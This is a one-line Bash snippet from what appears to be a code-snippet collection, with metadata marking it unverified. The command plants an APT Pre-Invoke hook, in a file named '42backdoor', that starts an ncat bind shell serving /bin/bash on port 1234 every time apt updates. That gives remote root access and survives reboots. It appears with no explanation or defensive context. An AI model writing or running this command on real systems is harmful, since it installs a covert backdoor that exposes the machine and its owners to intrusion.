---
id: ba0043fd-058c-4c11-b1f8-d4f1524226fa
type: code
language: Bash
verified: false
created_at: '2023-04-06T03:56:18.117260+00:00'
updated_at: '2023-04-10T20:34:19.269757+00:00'
---

# Code Snippet ba0043fd

**Language**: Bash

```bash
echo 'APT::Update::Pre-Invoke {"nohup ncat -lvp 1234 -e /bin/bash 2> /dev/null &"};' > /etc/apt/apt.conf.d/42backdoor
```


